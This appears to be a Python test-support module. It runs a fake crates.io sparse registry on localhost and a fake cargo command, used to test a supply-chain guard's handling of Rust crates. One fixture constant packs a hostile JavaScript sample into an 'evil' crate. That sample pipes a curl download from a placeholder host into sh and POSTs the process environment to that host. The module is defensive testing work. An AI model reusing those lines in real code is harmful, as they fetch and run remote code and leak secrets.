"""A fake crates.io (a sparse registry) on 127.0.0.1, and a fake `cargo` command, for the guard's Cargo tests. Nothing here is a test.

The registry answers what cargo and the guard ask of a sparse registry (config.json, an index file per crate, the `.crate` files,
and crates.io's API for a publish time) for crates built in memory; every hostile payload is inert text (hosts are 192.0.2.x). The
fake `cargo` stands in for the real one where a test needs to say exactly what the tool does (write this Cargo.lock, leave that in
cargo's folder)."""

import datetime
import hashlib
import http.server
import io
import json
import os
import socketserver
import stat
import sys
import tarfile
import threading
import urllib.parse

from lazaret.registry.ecosystems import crates

NOW = datetime.datetime.now(datetime.timezone.utc)
OLD = NOW - datetime.timedelta(days=30)
FRESH = NOW - datetime.timedelta(hours=1)
CRATES_IO = "registry+https://github.com/rust-lang/crates.io-index"

#: a JavaScript file that reads the environment and sends it away: what the registry scanner calls SUSPICIOUS in any archive
EXFIL_JS = ("require('child_process').exec('curl http://192.0.2.9/x | sh');\n"
            "fetch('http://192.0.2.9/up', {method: 'POST', body: JSON.stringify(process.env)});\n")


def pubtime(dt):
    return dt.strftime("%Y-%m-%dT%H:%M:%SZ")


def crate_tgz(name, version, files):
    """-> the bytes of `name-version.crate`: a gzipped tar with every member under `name-version/`, as cargo packages one."""
    body = {"Cargo.toml": f'[package]\nname = "{name}"\nversion = "{version}"\nedition = "2021"\n', "src/lib.rs": "pub fn f() {}\n"}
    body.update(files)
    buf = io.BytesIO()
    with tarfile.open(fileobj=buf, mode="w:gz") as tf:
        for member, text in sorted(body.items()):
            raw = text.encode("utf-8") if isinstance(text, str) else text
            info = tarfile.TarInfo(f"{name}-{version}/{member}")
            info.size = len(raw)
            info.mtime = 0
            tf.addfile(info, io.BytesIO(raw))
    return buf.getvalue()


def lock_text(packages, source=CRATES_IO, version=4):
    """A Cargo.lock for [(name, version, checksum or None, [dependency names])]: the first is the project's own (no source, no
    checksum); the others are from `source` (None: a path dependency; another text: that source)."""
    out = [f"version = {version}", ""]
    for k, (name, vers, checksum, deps) in enumerate(packages):
        out += ["[[package]]", f'name = "{name}"', f'version = "{vers}"']
        if k and source:
            out.append(f'source = "{source}"')
        if k and checksum:
            out.append(f'checksum = "{checksum}"')
        if deps:
            out.append("dependencies = [" + ", ".join(f'"{d}"' for d in deps) + "]")
        out.append("")
    return "\n".join(out)


class CratesRegistry:
    """A sparse registry: add(name, version, files, deps, published, ...). `requests` is the path of every request,
    `authorizations` (path, Authorization header). With `auth` (a whole Authorization header value) it answers 401 to a request
    without it; `fail` maps a path suffix to (status, body); `pubtimes` False leaves `pubtime` out of the index (a registry that
    has none), and the API then says when; `api` False has no API; `plain_dl` makes `dl` a URL with no markers, so that the
    download is `<dl>/<crate>/<version>/download`."""

    def __init__(self, auth=None, pubtimes=True, api=True, plain_dl=False):
        self.versions = {}                     # name -> {version: {"data", "cksum", "deps", "time", "yanked"}}
        self.requests = []
        self.authorizations = []
        self.auth = auth
        self.pubtimes = pubtimes
        self.api = api
        self.plain_dl = plain_dl
        self.fail = {}
        registry = self

        class Handler(http.server.BaseHTTPRequestHandler):
            protocol_version = "HTTP/1.1"

            def log_message(self, *args):
                pass

            def do_GET(self):
                path = urllib.parse.unquote(urllib.parse.urlsplit(self.path).path)
                registry.requests.append(path)
                registry.authorizations.append((path, self.headers.get("Authorization")))
                if registry.auth is not None and self.headers.get("Authorization") != registry.auth:
                    code, body, ctype = 401, b"authentication required\n", "text/plain"
                else:
                    code, body, ctype = registry.answer(path)
                    for suffix, (status, text) in registry.fail.items():
                        if path.endswith(suffix):
                            code, body, ctype = status, text, "text/plain"
                self.send_response(code)
                self.send_header("Content-Type", ctype)
                self.send_header("Content-Length", str(len(body)))
                self.end_headers()
                self.wfile.write(body)

        class Server(socketserver.ThreadingMixIn, http.server.HTTPServer):
            daemon_threads = True

        self.server = Server(("127.0.0.1", 0), Handler)
        self.url = f"http://127.0.0.1:{self.server.server_address[1]}/"
        threading.Thread(target=self.server.serve_forever, kwargs={"poll_interval": 0.05}, daemon=True).start()

    def add(self, name, version, files=None, deps=(), published=OLD, yanked=False):
        """Publish a crate -> the SHA-256 (hex) of its `.crate`. deps: [(name, requirement)]."""
        data = crate_tgz(name, version, files or {})
        cksum = hashlib.sha256(data).hexdigest()
        self.versions.setdefault(name, {})[version] = {"data": data, "cksum": cksum, "deps": list(deps), "time": published,
                                                       "yanked": yanked}
        return cksum

    def checksum(self, name, version):
        return self.versions[name][version]["cksum"]

    def index_lines(self, name):
        lines = []
        for version, rec in self.versions[name].items():
            line = {"name": name, "vers": version, "cksum": rec["cksum"], "features": {}, "yanked": rec["yanked"], "v": 2,
                    "deps": [{"name": d, "req": req, "features": [], "optional": False, "default_features": True, "target": None,
                              "kind": "normal"} for d, req in rec["deps"]]}
            if self.pubtimes:
                line["pubtime"] = pubtime(rec["time"])
            lines.append(json.dumps(line))
        return ("\n".join(lines) + "\n").encode()

    def answer(self, path):
        text = "text/plain"
        if path == "/config.json":
            dl = self.url + "dl" if self.plain_dl else self.url + "dl/{crate}/{crate}-{version}.crate"
            return 200, json.dumps({"dl": dl, "api": self.url.rstrip("/")}).encode(), "application/json"
        if path.startswith("/api/v1/crates/"):
            parts = path[len("/api/v1/crates/"):].split("/")
            rec = self.versions.get(parts[0], {}).get(parts[1]) if self.api and len(parts) == 2 else None
            if rec is None:
                return 404, b"not found\n", text
            return 200, json.dumps({"version": {"num": parts[1], "created_at": rec["time"].strftime(
                "%Y-%m-%dT%H:%M:%S.123456+00:00")}}).encode(), "application/json"
        if path.startswith("/dl/"):
            parts = path[len("/dl/"):].split("/")
            if self.plain_dl and len(parts) == 3 and parts[2] == "download":
                name, version = parts[0], parts[1]
            elif len(parts) == 2 and parts[1].endswith(".crate") and parts[1].startswith(parts[0] + "-"):
                name, version = parts[0], parts[1][len(parts[0]) + 1:-len(".crate")]
            else:
                return 404, b"not found\n", text
            rec = self.versions.get(name, {}).get(version)
            return (200, rec["data"], "application/octet-stream") if rec else (404, b"not found\n", text)
        for name in self.versions:
            if path == "/" + crates.index_path(name):
                return 200, self.index_lines(name), text
        return 404, b"not found\n", text

    def paths(self, prefix=""):
        """The paths asked for (those starting with `prefix`), in order."""
        return [p for p in self.requests if p.startswith(prefix)]

    def close(self):
        self.server.shutdown()
        self.server.server_close()


def default_crates(reg):
    """The crates the Cargo guard tests use: a clean one that needs another, a hostile one, a parent that needs the hostile one,
    and crates with a new release. -> {name: checksum of the first version}"""
    sums = {}
    sums["leaf"] = reg.add("leaf", "1.0.0")
    sums["good"] = reg.add("good", "1.0.0", deps=[("leaf", "^1")])
    sums["evil"] = reg.add("evil", "1.0.0", files={"web/x.js": EXFIL_JS})
    sums["parent"] = reg.add("parent", "1.0.0", deps=[("evil", "^1")])
    sums["mixed"] = reg.add("mixed", "1.0.0")
    reg.add("mixed", "1.1.0", published=FRESH)
    sums["onlynew"] = reg.add("onlynew", "1.0.0", published=FRESH)
    sums["foo_bar"] = reg.add("foo_bar", "0.2.0")
    return sums


FAKE_CARGO = r'''#!@@PYTHON@@
"""A stand-in for the cargo command. FAKE_CARGO_ROOT: the workspace root; FAKE_CARGO_META: what `cargo metadata` prints (null: it
fails); FAKE_CARGO_PLAN: {subcommand: [steps]} for every other command; FAKE_CARGO_SCRATCH: {crate: Cargo.lock text} for
`generate-lockfile` of a project that needs that crate; FAKE_CARGO_LOG: where it writes {"argv", "cwd", "CARGO_HOME"}, one line
per run. Steps: ["lock", text] writes Cargo.lock at the root, ["write", path, text], ["append", path, text],
["unpack", home, "name-version"] makes a folder where cargo unpacks a crate, ["exit", code]."""
import json, os, re, sys

args = sys.argv[1:]
if args and args[0].startswith("+"):
    args = args[1:]
root = os.environ.get("FAKE_CARGO_ROOT") or os.getcwd()
log = os.environ.get("FAKE_CARGO_LOG")
sub = args[0] if args else ""
if log:
    entry = {"argv": sys.argv[1:], "cwd": os.getcwd(), "CARGO_HOME": os.environ.get("CARGO_HOME")}
    if sub == "generate-lockfile" and "--manifest-path" in args:
        with open(args[args.index("--manifest-path") + 1], encoding="utf-8") as f:
            entry["manifest"] = f.read()
    with open(log, "a", encoding="utf-8") as f:
        f.write(json.dumps(entry) + "\n")
if sub == "metadata":
    meta = json.loads(os.environ.get("FAKE_CARGO_META", "{}"))
    if meta is None:
        print("error: could not find `Cargo.toml`", file=sys.stderr)
        sys.exit(101)
    if not meta:
        meta = {"workspace_root": root, "packages": [{"manifest_path": os.path.join(root, "Cargo.toml")}]}
    print(json.dumps(meta))
    sys.exit(0)
if sub == "generate-lockfile" and "--manifest-path" in args:
    manifest = args[args.index("--manifest-path") + 1]
    with open(manifest, encoding="utf-8") as f:
        text = f.read()
    wanted = re.search(r"\[dependencies\]\s*\n\s*([A-Za-z0-9_-]+) =", text).group(1)
    scratch = json.loads(os.environ.get("FAKE_CARGO_SCRATCH", "{}"))
    if wanted not in scratch:
        print("error: no matching package named `" + wanted + "` found", file=sys.stderr)
        sys.exit(101)
    with open(os.path.join(os.path.dirname(manifest), "Cargo.lock"), "w", encoding="utf-8") as f:
        f.write(scratch[wanted])
    sys.exit(0)
code = 0
for step in json.loads(os.environ.get("FAKE_CARGO_PLAN", "{}")).get(sub, []):
    kind = step[0]
    if kind == "lock":
        with open(os.path.join(root, "Cargo.lock"), "w", encoding="utf-8") as f:
            f.write(step[1])
    elif kind == "write":
        os.makedirs(os.path.dirname(step[1]) or ".", exist_ok=True)
        with open(step[1], "w", encoding="utf-8") as f:
            f.write(step[2])
    elif kind == "append":
        with open(step[1], "a", encoding="utf-8") as f:
            f.write(step[2])
    elif kind == "unpack":
        os.makedirs(os.path.join(step[1], "registry", "src", "index.crates.io-0000000000000000", step[2]), exist_ok=True)
    elif kind == "exit":
        code = step[1]
sys.exit(code)
'''


def install_fake_cargo(folder):
    """Put a fake `cargo` in `folder` (and so on PATH, when it is put there) -> its path."""
    path = os.path.join(folder, "cargo")
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(FAKE_CARGO.replace("@@PYTHON@@", sys.executable))
    os.chmod(path, os.stat(path).st_mode | stat.S_IXUSR | stat.S_IXGRP | stat.S_IXOTH)
    return path
